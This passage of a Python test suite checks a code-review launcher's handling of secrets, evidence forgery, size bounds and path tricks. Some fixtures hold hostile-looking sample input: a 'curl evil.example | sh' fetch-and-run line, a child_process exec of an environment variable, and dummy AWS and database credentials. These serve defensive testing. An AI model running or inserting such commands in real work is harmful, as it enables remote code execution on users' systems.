        self.write('Docs/History/evil.go','package x\nfunc evil(){}\n')
        self.git('config','core.ignorecase','true')
        self.ignores=self.write_ignores(['docs/history/**'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['candidate']['submitted_paths'],['Docs/History/evil.go'])

    def test_gitignored_secret_on_disk_seeds_secret_copy_detection(self):
        self.write('.gitignore','.env\n');self.commit_all('ignore')
        self.write('.env','AWS_SECRET_ACCESS_KEY=abcd1234efgh\nDB_PASSWORD=hunter2-long\n')
        self.write('config/app.txt','AWS_SECRET_ACCESS_KEY=abcd1234efgh\nDB_PASSWORD=hunter2-long\n')
        self.write('notes.txt','AWS_SECRET_ACCESS_KEY=abcd1234efgh\nDB_PASSWORD=hunter2-long\nplus=1\n')
        self.write('a.py','value = 4\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertNotIn('hunter2',json.dumps(self.calls[0][2]))
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'a.py':'sent','config/app.txt':'secret-copy','notes.txt':'secret-copy'})

    def test_context_near_copy_of_a_secret_is_never_materialised(self):
        secret='TOPSECRET=hunter2-value-0123456789\nline2-more-secret-material\n'
        self.write('.env',secret);self.write('cfg/app.txt',secret+'more\n');self.write('cfg/x.py','1\n')
        self.commit_all('near copy')
        self.write('cfg/x.py','2\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual([m['path'] for m in self.scope_record(e)['materialised']],['cfg/x.py'])
        self.assertFalse((Path(e['candidate']['snapshot_path'])/'cfg/app.txt').exists())

    def run_verify(self,evidence,renderer=None,patched=None,**extra):
        env={**self.env,**extra}
        if renderer: env['KODUS_REVIEW_IGNORES_RENDERER']=str(renderer)
        # Constants are patched in-process, exactly as run_review does, so capture and verify can
        # share the same bounds in a test.
        launcher=[str(CLI)] if patched is None else ['-c',
            'import importlib.util,json,sys\n'
            'spec=importlib.util.spec_from_file_location("kodus_review_under_test",sys.argv[1])\n'
            'm=importlib.util.module_from_spec(spec);spec.loader.exec_module(m)\n'
            'for k,v in json.loads(sys.argv[2]).items(): setattr(m,k,v)\n'
            'sys.argv=["kodus_review"]+sys.argv[3:];sys.exit(m.main())',str(CLI),json.dumps(patched)]
        run=subprocess.run([sys.executable,*launcher,'verify','--evidence',str(evidence),'--repo',str(self.repo)],
                           env=env,capture_output=True,text=True,timeout=60)
        return run.returncode,json.loads(run.stdout)

    def test_verify_accepts_a_genuine_result_and_refuses_hand_written_evidence(self):
        self.write('a.py','value = 30\n');self.write('gen/x.lock','l\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        self.assertEqual(report['submitted_paths'],['a.py'])
        def forged(change):
            return self.forge(e['evidence_path'],change)
        cases={'disposition':lambda d:d['candidate']['dispositions'][0].update(disposition='ignored'),
               'skipped':lambda d:d.update(kodus={'verdict':'SKIPPED','skip_reason':'all-changed-paths-ignored'}),
               'submitted':lambda d:d['candidate'].update(submitted_paths=[]),
               'files analyzed':lambda d:d['kodus']['result'].update(filesAnalyzed=0),
               'verdict':lambda d:d['kodus']['result'].update(issues=[{'file':'a.py','line':1,'severity':'high','message':'m'}]),
               'unbound':lambda d:d['candidate'].update(ignores_renderer_verified=False),
               'repository':lambda d:d['candidate'].update(repository='example/other')}
        for label,change in cases.items():
            with self.subTest(case=label):
                code,report=self.run_verify(forged(change),renderer)
                self.assertEqual((code,report['verdict']),(2,'MISMATCH'),report)
        with self.subTest(case='no launcher renderer'):
            code,report=self.run_verify(e['evidence_path'])
            self.assertEqual(code,2);self.assertIn('launcher',report['error'])
        with self.subTest(case='tampered artifact'):
            submitted=Path(e['candidate']['submitted_patch_path']);submitted.chmod(0o644)
            submitted.write_text(submitted.read_text().replace('value = 30','value = 31'))
            code,report=self.run_verify(e['evidence_path'],renderer)
            self.assertEqual(code,2);self.assertIn('submitted_patch_path',report['error'])

    def test_verify_refuses_a_run_bound_to_a_script_renderer(self):
        self.write('a.py','value = 31\n')
        genuine,_=self.write_renderer(self.ignores.read_bytes())
        self.ignores=self.write_ignores(['**/*.py','**/*.lock'])
        script,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(script),
                               'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent')})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['kodus']['verdict'],'SKIPPED');self.assertTrue(e['candidate']['ignores_renderer_verified'])
        code,report=self.run_verify(e['evidence_path'],genuine)
        self.assertEqual(code,2);self.assertIn('differs from the pinned central render',report['error'])

    def test_withheld_file_replaced_by_a_directory_keeps_its_sent_children(self):
        self.write('logo.png',b'\x89PNG\x00\x01binary');self.write('.env','TOKEN=x\n');self.commit_all('files')
        head_file=self.base
        (self.repo/'logo.png').unlink();(self.repo/'.env').unlink()
        self.write('logo.png/notes.txt','notes\n');self.write('.env/readme.md','docs\n')
        self.commit_all('dirs');head=self.base;self.base=head_file
        self.response['filesAnalyzed']=2
        run,e=self.run_review({},'--head',head)
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'.env':'secret-pattern','.env/readme.md':'sent','logo.png':'binary','logo.png/notes.txt':'sent'})
        body=self.calls[0][2]
        self.assertEqual(self.kodus_paths(0),['.env/readme.md','logo.png/notes.txt'])
        self.assertNotIn('TOKEN',body['diff']);self.assertNotIn('GIT binary patch',body['diff'])

    def test_secret_copy_detection_fails_closed_when_it_cannot_run_completely(self):
        secret='TOPSECRET=hunter2-value-0123456789\n'
        self.write('.env',secret);self.commit_all('env')
        # Candidates within the size window of the secret, so detection really runs.
        self.write('a.py','value = 5  # padding to a comparable size\n');self.write('b.py','value = 6  # padding to a comparable size\n')
        self.response['filesAnalyzed']=2
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['candidate']['submitted_paths'],['a.py','b.py'])
        for label,patched in (('pair bound',{'MAX_COPY_PAIRS':1}),('blob bound',{'COPY_BLOB_LIMIT':2}),
                              ('git skipped detection',{'COPY_RENAME_LIMIT':1}),('timeout',{'COPY_TIMEOUT':0.0001})):
            with self.subTest(case=label):
                calls=len(self.calls)
                run,e=self.run_review(patched=patched)
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertIn('Secret copy detection',e['kodus']['error'])
                self.assertEqual(len(self.calls),calls)

    def test_review_timeout_ceiling_is_3600_seconds(self):
        self.write('a.py','value = 40\n')
        run,e=self.run_review({'KODUS_REVIEW_TIMEOUT':'3600'})
        self.assertEqual(run.returncode,0,run.stderr)
        calls=len(self.calls)
        run,e=self.run_review({'KODUS_REVIEW_TIMEOUT':'3601'})
        self.assertEqual(run.returncode,2,run.stderr);self.assertIn('timeout',e['kodus']['error'])
        self.assertEqual(len(self.calls),calls)

    def forge(self,evidence_path,change):
        # A forger copies the artifacts beside the forged file, as verify derives them from there.
        path=self.root/('forged-'+str(len(list(self.root.glob('forged-*.json'))))+'.json')
        shutil.copytree(str(evidence_path)+'.artifacts',str(path)+'.artifacts')
        text=Path(evidence_path).read_text().replace(str(evidence_path)+'.artifacts',str(path)+'.artifacts')
        doc=json.loads(text);change(doc);path.write_text(json.dumps(doc))
        return path

    def test_verify_binds_the_kodus_job_result(self):
        self.write('a.py','value = 50\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        bound={'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)}
        # A genuine PASS and a genuine FAIL both verify, and the output names base, head and tree.
        run,e=self.run_review(bound);self.assertEqual(run.returncode,0,run.stderr)
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict'],report['kodus_verdict']),(0,'VERIFIED','PASS'),report)
        self.assertEqual((report['base'],report['head'],report['tree']),(self.base,None,e['candidate']['tree']))
        self.assertEqual(report['job_id'],'synthetic-job')
        self.response['issues']=[{'file':'a.py','line':1,'severity':'critical','message':'bad'}]
        run,failed=self.run_review(bound);self.assertEqual(run.returncode,1,run.stderr)
        code,report=self.run_verify(failed['evidence_path'],renderer)
        self.assertEqual((code,report['kodus_verdict']),(0,'FAIL'),report)
        cases={'findings deleted and verdict flipped':lambda d:(d['kodus'].update(verdict='PASS'),
                                                               d['kodus']['result'].update(issues=[])),
               'fabricated job id':lambda d:d['kodus'].update(job_id='forged-job'),
               'created time edited':lambda d:d['kodus'].update(job_created_at='2001-01-01T00:00:00.000Z')}
        for label,change in cases.items():
            with self.subTest(case=label):
                code,report=self.run_verify(self.forge(failed['evidence_path'],change),renderer)
                self.assertEqual((code,report['verdict']),(2,'MISMATCH'),report)
        with self.subTest(case='fetched result differs'):
            self.response['issues']=[]
            code,report=self.run_verify(failed['evidence_path'],renderer)
            self.assertEqual(code,2);self.assertIn('result differs',report['error'])
        with self.subTest(case='network failure'):
            # Same pinned origin, server gone.
            self.server.shutdown();self.server.server_close()
            code,report=self.run_verify(e['evidence_path'],renderer)
            # Transport failures on the job re-fetch are retried until the deadline, then mismatch.
            self.assertEqual(code,2);self.assertIn('transport',report['error'])

    def test_verify_refuses_a_job_created_before_the_capture(self):
        self.write('a.py','value = 51\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        self.created_override='2001-01-01T00:00:00.000Z'
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['kodus']['job_created_at'],'2001-01-01T00:00:00.000Z')
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual(code,2);self.assertIn('before the candidate was captured',report['error'])

    def test_verify_reproduces_a_secret_copy_of_a_gitignored_secret(self):
        self.write('.gitignore','.env\n');self.commit_all('ignore')
        # A near copy: the working-tree snapshot stores config/app.txt, never the .env blob itself.
        self.write('.env','TOPSECRET=hunter2-long-value\nX=1\n');self.write('config/app.txt','TOPSECRET=hunter2-long-value\nX=1\nY=2\n')
        self.write('a.py','value = 52\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'a.py':'sent','config/app.txt':'secret-copy'})
        recorded=self.scope_record(e)['ondisk_secret_blobs']
        secret=self.git('hash-object','--no-filters','.env').strip()
        self.assertEqual(recorded,[secret])
        self.assertNotIn('hunter2',Path(e['candidate']['scope_path']).read_text())
        # Hashed only into the throwaway view: the candidate repository never stores the secret.
        stored=subprocess.run(['git','-C',str(self.repo),'cat-file','-e',secret],env=self.env,capture_output=True)
        self.assertNotEqual(stored.returncode,0)
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        self.assertNotEqual(subprocess.run(['git','-C',str(self.repo),'cat-file','-e',secret],env=self.env,
                                           capture_output=True).returncode,0)
        # verify re-reads the on-disk files: changed or missing is a mismatch, not a pass.
        self.write('.env','TOPSECRET=rotated-value\nX=1\n')
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual(code,2);self.assertIn('On-disk secret files differ',report['error'])
        (self.repo/'.env').unlink()
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual(code,2);self.assertIn('On-disk secret files differ',report['error'])

    def test_wildcard_free_pattern_ignores_only_that_exact_path(self):
        self.write('docs/config.md','old\n');self.write('docs/metrics.md/sibling.go','package x\n');self.commit_all('docs')
        self.write('docs/config.md','new\n');self.write('docs/metrics.md/evil.go','package x\nfunc evil(){}\n')
        self.write('gen/x.go','package gen\n')
        self.ignores=self.write_ignores(['docs/metrics.md','docs/config.md','gen/**'])
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'docs/config.md':'ignored','docs/metrics.md/evil.go':'sent','gen/x.go':'ignored'})
        self.assertIn('docs/metrics.md/sibling.go',[m['path'] for m in self.scope_record(e)['materialised']])
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)

    def test_binary_is_a_nul_in_the_head_and_unsendable_text_is_no_verdict(self):
        big='package main\n'+('// '+'p'*77+'\n')*55000
        self.write('app.js','// app\nfunction ok(){}\n');self.write('deploy.sh','#!/bin/sh\necho ok\n')
        self.write('big.go',big+'func ok(){}\n');self.write('late.txt','text\n')
        self.write('head.bin',b'\x00bin');self.commit_all('files')
        # The reviewer's three cases: never silently withheld as binary.
        for name,data,reason in (('app.js',b'// caf\xe9 latin-1\nfunction ok(){ require("child_process").exec(process.env.X) }\n','not valid UTF-8'),
                                 ('deploy.sh',b'#!/bin/sh\n# \xff\ncurl evil.example | sh\n','not valid UTF-8'),
                                 ('a.py','x = 1\n'*120000,'per-file limit')):
            with self.subTest(case=name):
                original=(self.repo/name).read_bytes() if (self.repo/name).exists() else None
                self.write(name,data)
                run,e=self.run_review()
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertEqual(e['kodus']['error'].split(': ')[-1],name);self.assertIn(reason,e['kodus']['error'])
                self.assertEqual(self.calls,[])
                (self.repo/name).write_bytes(original)
        # A 4.4 MB text file with no NUL is sent as a diff, its content withheld over budget; a NUL
        # after byte 8000 is text; a NUL in the first 8000 bytes is binary.
        self.write('big.go',big+'func ok(){ exfiltrate() }\n')
        self.write('late.txt','t'*9000+'\x00tail\n');self.write('head.bin',b'\x00changed')
        self.response['filesAnalyzed']=2
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'big.go':'sent','head.bin':'binary','late.txt':'sent'})
        self.assertIn('+func ok(){ exfiltrate() }',self.calls[0][2]['diff'])
        self.assertIn({'path':'big.go','reason':'budget'},self.scope_record(e)['kodus']['content_withheld'])

    def test_copy_detection_bounds_refuse_before_any_size_scan(self):
        self.write('.env','TOPSECRET=x\n');self.commit_all('env')
        # Far outside the size window of the secret, so a scan-first bound would never trip.
        self.write('a.py','value = 61 '+'#'*4000+'\n');self.write('b.py','value = 62 '+'#'*4000+'\n')
        self.response['filesAnalyzed']=2
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        calls=len(self.calls)
        run,e=self.run_review(patched={'COPY_BLOB_LIMIT':2})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('exceeds its bound',e['kodus']['error'])
        self.assertEqual(len(self.calls),calls)

    def test_verify_uses_only_the_launcher_endpoint_and_refuses_fixture_evidence_outside_it(self):
        self.write('a.py','value = 63\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertTrue(e['kodus']['synthetic_fixture'])
        production=self.root/'production-token';production.write_text('kodus_live_key')
        code,report=self.run_verify(e['evidence_path'],renderer,KODUS_REVIEW_API_URL='https://kodus.example.invalid',
                                    KODUS_REVIEW_TOKEN_FILE=str(production))
        self.assertEqual(code,2);self.assertIn('different Kodus endpoint',report['error'])
        forged=self.forge(e['evidence_path'],lambda d:d['kodus'].update(api_origin='http://127.0.0.1:1'))
        code,report=self.run_verify(forged,renderer)
        self.assertEqual(code,2);self.assertIn('different Kodus endpoint',report['error'])
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)

    def test_wildcard_free_patterns_match_exact_paths_only(self):
        self.write('vendor/lib.js','a\n');self.write('vendor/other.js','b\n');self.commit_all('vendor')
        self.write('vendor/lib.js','a2\n');self.write('vendor/other.js','b2\n');self.write('a.py','value = 70\n')
        # `vendor` names a directory: its children are not ignored by it; `vendor/lib.js` names a file.
        self.ignores=self.write_ignores(['vendor','vendor/lib.js'])
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        self.response['filesAnalyzed']=2
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'a.py':'sent','vendor/lib.js':'ignored','vendor/other.js':'sent'})
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)

    def test_pinned_git_is_required_outside_the_fixture(self):
        self.write('a.py','value = 71\n')
        production=self.root/'production-token';production.write_text('kodus_live_key')
        plain=self.root/'git-not-executable';plain.write_text('#!/bin/sh\n');plain.chmod(0o644)
        outside={'KODUS_REVIEW_API_URL':'https://kodus.example.invalid','KODUS_REVIEW_TOKEN_FILE':str(production)}
        for label,changes in (('unset',{**outside,'KODUS_REVIEW_GIT':''}),('relative',{'KODUS_REVIEW_GIT':'git'}),
                              ('not executable',{'KODUS_REVIEW_GIT':str(plain)}),
                              ('directory',{'KODUS_REVIEW_GIT':str(self.root)})):
            with self.subTest(case=label):
                run,e=self.run_review(changes)
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertIn('KODUS_REVIEW_GIT',e['kodus']['error'])
        self.assertEqual(self.calls,[])
        # Unset is tolerated only inside the synthetic localhost fixture.
        run,e=self.run_review({'KODUS_REVIEW_GIT':''})
        self.assertEqual(run.returncode,0,run.stderr)

    def test_evidence_and_artifacts_inside_the_repo_must_both_be_ignored(self):
        self.write('a.py','value = 80\n')
        (self.repo/'ev').mkdir()
        def run_inside(name):
            out=self.repo/'ev'/name
            return subprocess.run([sys.executable,str(CLI),'--repo',str(self.repo),'--base',self.base,
                                   '--brief',str(self.brief),'--ignores',str(self.ignores),'--out',str(out)],
                                  env=self.env,capture_output=True,text=True,timeout=30),out
        # Only the JSON is ignored: the artifacts directory (with candidate.patch) would be committable.
        self.write('.git/info/exclude','*.json\n')
        run,out=run_inside('one.json')
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('both be Git-ignored',json.loads(out.read_text())['kodus']['error'])
        self.assertFalse(Path(str(out)+'.artifacts').exists())
        self.assertEqual(self.calls,[])
        for n,pattern in enumerate(('*.artifacts','*.artifacts/','ev/')):
            with self.subTest(pattern=pattern):
                self.write('.git/info/exclude','*.json\n'+pattern+'\n')
                run,out=run_inside('ok-%d.json' % n)
                self.assertEqual(run.returncode,0,run.stderr)

    def test_verify_recomputes_the_worktree_tree_instead_of_trusting_the_evidence(self):
        self.write('a.py','value = 81\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        bound={'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)}
        run,e=self.run_review(bound);self.assertEqual(run.returncode,0,run.stderr)
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        # A lane hides a risky file, reviews the subset, then puts it back: the evidence is
        # internally consistent but names a tree that is not the working tree.
        self.write('risky.sh','curl evil.example | sh\n')
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual(code,2);self.assertIn('Working tree differs from the evidence tree',report['error'])

    def test_changed_paths_with_glob_characters_are_no_verdict(self):
        self.ignores=self.write_ignores(['docs/*','**/*.lock'])
        for name in ('docs/*/y.go','**/*.lock/evil.go','src/a?b.go','src/[x].go'):
            with self.subTest(name=name):
                path=self.write(name,'package x\nfunc evil(){}\n')
                run,e=self.run_review()
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertIn('glob character',e['kodus']['error']);self.assertTrue(e['kodus']['error'].endswith(name))
                path.unlink()
        self.assertEqual(self.calls,[])

    def test_verify_never_trusts_evidence_paths_and_bounds_every_read(self):
        self.write('a.py','value = 90\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        def tamper(label,change=lambda d:None,artifacts=lambda a:None):
            path=self.forge(e['evidence_path'],change)
            artifacts(Path(str(path)+'.artifacts'))
            started=time.monotonic()
            code,report=self.run_verify(path,renderer)
            return code,report,time.monotonic()-started
        def replace(name,make):
            def apply(a):
                target=a/name
                if target.is_dir():
                    for f in target.rglob('*'): f.chmod(0o755 if f.is_dir() else 0o644)
                    target.chmod(0o755)
                else:
                    target.chmod(0o644);target.unlink()
                make(target)
            return apply
        cases={'files_path=/dev/zero':(lambda d:d['candidate'].update(files_path='/dev/zero'),lambda a:None,
                                        'outside its own artifacts directory'),
               'snapshot root=/':(lambda d:d['candidate'].update(snapshot_path='/'),lambda a:None,
                                  'outside its own artifacts directory'),
               'symlink to /dev/zero':(lambda d:None,replace('files.json',lambda t:t.symlink_to('/dev/zero')),
                                       'missing or a symlink'),
               'fifo artifact':(lambda d:None,replace('scope.json',lambda t:os.mkfifo(t)),'not a regular file'),
               'oversize brief':(lambda d:None,replace('brief.txt',lambda t:t.write_bytes(b'x'*100001)),
                                 'exceeds its size bound'),
               'symlink in snapshot':(lambda d:None,lambda a:((a/'snapshot').chmod(0o755),
                                                             (a/'snapshot/escape').symlink_to('/')),
                                      'symlink')}
        for label,(change,artifacts,reason) in cases.items():
            with self.subTest(case=label):
                code,report,elapsed=tamper(label,change,artifacts)
                self.assertEqual((code,report['verdict']),(2,'MISMATCH'),report)
                self.assertIn(reason,report['error']);self.assertLess(elapsed,20)

    def test_huge_sibling_directory_is_budget_bounded_before_copy_detection(self):
        secret='TOPSECRET=hunter2-value-0123456789\nline2-more-secret-material\n'
        self.write('.env',secret)
        folder=self.repo/'d';folder.mkdir()
        for i in range(40000):
            (folder/('f%05d.txt' % i)).write_text('sibling %d\n' % i)
        # Sorts first among the siblings, so it is inside the admitted prefix.
        self.write('d/a-near.txt',secret+'more\n');self.write('d/z.py','value = 1\n')
        self.commit_all('siblings')
        base=self.base
        self.write('d/z.py','value = 2\n');self.commit_all('change');head=self.base;self.base=base
        self.ignores=self.write_ignores([],snapshot_budget_bytes=64*1024)
        run,e=self.run_review({},'--head',head)
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        self.assertEqual(e['kodus']['verdict'],'PASS')
        record=self.scope_record(e)
        materialised=[m['path'] for m in record['materialised']]
        self.assertIn('d/z.py',materialised);self.assertNotIn('d/a-near.txt',materialised)
        self.assertIn({'path':'d/a-near.txt','reason':'secret-copy'},record['omitted'])
        self.assertGreater(sum(1 for o in record['omitted'] if o['reason']=='budget'),30000)
        self.assertLessEqual(record['budget']['snapshot_bytes_used'],64*1024)
        self.assertFalse((Path(e['candidate']['snapshot_path'])/'d/a-near.txt').exists())

    def test_snapshot_entry_bound_is_shared_by_capture_and_verify(self):
        bound={'MAX_SNAPSHOT_ENTRIES':20}
        for i in range(100):
            self.write('d/s%03d.txt' % i,'sibling %d\n' % i)
        self.write('d/z.py','value = 1\n');self.commit_all('siblings')
        self.write('d/z.py','value = 2\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)},patched=bound)
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        record=self.scope_record(e)
        self.assertGreater(sum(1 for o in record['omitted'] if o['reason']=='budget'),70)
        for key in ('snapshot_path','base_snapshot_path'):
            self.assertLessEqual(sum(1 for _ in Path(e['candidate'][key]).rglob('*')),20)
        code,report=self.run_verify(e['evidence_path'],renderer,patched=bound)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        # Changed files alone over the entry bound: no verdict at capture, before any request.
        calls=len(self.calls)
        for i in range(25):
            self.write('c%02d.py' % i,'changed %d\n' % i)
        run,e=self.run_review(patched=bound)
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('snapshot entry bound',e['kodus']['error'])
        self.assertEqual(len(self.calls),calls)

    def test_every_artifact_bound_is_enforced_at_capture_and_met_by_verify(self):
        self.write('a.py','value = 100\n'*20)
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        bound={'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)}
        run,e=self.run_review(bound);self.assertEqual(run.returncode,0,run.stderr)
        c=e['candidate'];size=lambda key:Path(c[key]).stat().st_size
        exact={'MAX_MANIFEST_BYTES':max(size('manifest_path'),size('base_manifest_path')),
               'MAX_FILES_JSON_BYTES':size('files_path'),'MAX_SCOPE_JSON_BYTES':size('scope_path'),
               'MAX_BRIEF_BYTES':size('brief_path'),'MAX_PATCH_BYTES':size('submitted_patch_path'),
               'MAX_FULL_PATCH_BYTES':size('patch_path'),'MAX_EVIDENCE_BYTES':Path(e['evidence_path']).stat().st_size}
        # Exactly at every bound, verify accepts what capture wrote.
        code,report=self.run_verify(e['evidence_path'],renderer,patched=exact)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        # One byte under a bound, capture refuses naming the artifact, before any request.
        for constant,reason in (('MAX_MANIFEST_BYTES','manifest'),('MAX_FILES_JSON_BYTES','files.json'),
                                ('MAX_SCOPE_JSON_BYTES','scope.json'),('MAX_BRIEF_BYTES','Brief'),
                                ('MAX_PATCH_BYTES','submission limit'),('MAX_FULL_PATCH_BYTES','full candidate patch')):
            with self.subTest(bound=constant):
                calls=len(self.calls)
                run,r=self.run_review(bound,patched={constant:exact[constant]-1})
                self.assertEqual(run.returncode,2,run.stderr);self.assertIn(reason,r['kodus']['error'])
                self.assertEqual(len(self.calls),calls)
        with self.subTest(bound='MAX_EVIDENCE_BYTES'):
            calls=len(self.calls)
            run,r=self.run_review(bound,patched={'MAX_EVIDENCE_BYTES':2000,'EVIDENCE_RESPONSE_RESERVE':0})
            self.assertEqual(run.returncode,2,run.stderr);self.assertIn('Evidence exceeds',r['kodus']['error'])
            self.assertEqual(len(self.calls),calls)

    def test_nothing_under_the_artifacts_directory_may_be_committable(self):
        self.write('a.py','value = 110\n')
        (self.repo/'ev').mkdir()
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        bound={**self.env,'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)}
        def run_inside(name,*extra):
            out=self.repo/'ev'/name
            run=subprocess.run([sys.executable,str(CLI),'--repo',str(self.repo),'--base',self.base,'--brief',str(self.brief),
                                '--ignores',str(self.ignores),'--out',str(out),*extra],env=bound,capture_output=True,text=True,timeout=60)
            return run,out,json.loads(out.read_text())
        # The JSON and candidate.patch are ignored, but snapshots, submitted.patch and brief.txt are not.
        self.write('.git/info/exclude','*.json\n**/candidate.patch\n')
        run,out,e=run_inside('partial.json')
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('would be committable',e['kodus']['error'])
        self.assertTrue(e['kodus']['error'].split(': ')[-1].startswith('ev/partial.json.artifacts/'))
        self.assertNotIn('candidate.patch',e['kodus']['error'])
        self.assertEqual(self.calls,[])
        # Every artifact ignored by name: capture passes and verifies; a file created later under
        # the directory is caught by verify.
        # (A pattern with a slash is anchored at the repository root, hence the ev/ prefix.)
        self.write('.git/info/exclude','*.json\nev/*.artifacts/snapshot/\nev/*.artifacts/base-snapshot/\n'
                                       'ev/*.artifacts/*.patch\nev/*.artifacts/*.json\nev/*.artifacts/brief.txt\n')
        run,out,e=run_inside('named.json')
        self.assertEqual(run.returncode,0,e['kodus'].get('error'))
        code,report=self.run_verify(out,renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        Path(str(out)+'.artifacts/notes.md').write_text('later\n')
        code,report=self.run_verify(out,renderer)
        self.assertEqual(code,2);self.assertIn('ev/named.json.artifacts/notes.md',report['error'])

    def test_over_count_change_set_refuses_before_probing_blobs(self):
        log=self.root/'git-calls.log'
        real=self.env['KODUS_REVIEW_GIT']
        wrapper=self.root/'logging-git';wrapper.write_text('#!/bin/sh\necho "$@" >> '+str(log)+'\nexec '+real+' "$@"\n')
        wrapper.chmod(0o755)
        for i in range(50):
            self.write('m%02d.py' % i,'changed %d\n' % i)
        run,e=self.run_review({'KODUS_REVIEW_GIT':str(wrapper)},patched={'MAX_SENT_FILES':5})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('API limit of 5',e['kodus']['error'])
        probes=[line for line in log.read_text().splitlines() if line.startswith('cat-file blob')]
        self.assertEqual(probes,[])
        self.assertEqual(self.calls,[])

    def test_committed_range_with_partially_ignored_artifacts_refuses(self):
        # A committed range: the working tree is not the candidate, so only the guard catches it.
        self.write('a.py','value = 111\n');self.commit_all('head');head=self.base
        self.base=self.git('rev-parse','HEAD~1').strip()
        (self.repo/'ev').mkdir()
        self.write('.git/info/exclude','*.json\n**/candidate.patch\n')
        out=self.repo/'ev/partial-head.json'
        run=subprocess.run([sys.executable,str(CLI),'--repo',str(self.repo),'--base',self.base,'--head',head,
                            '--brief',str(self.brief),'--ignores',str(self.ignores),'--out',str(out)],
                           env=self.env,capture_output=True,text=True,timeout=60)
        e=json.loads(out.read_text())
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('would be committable',e['kodus']['error'])
        self.assertEqual(self.calls,[])

    def test_job_polls_retry_transient_failures_but_never_the_enqueue(self):
        self.write('a.py','value = 120\n')
        fast={'RETRY_DELAYS':[0.05]}
        # Two 502s mid-poll, then success: the job completes and the retries are recorded.
        self.get_failures=2
        run,e=self.run_review(patched=fast)
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
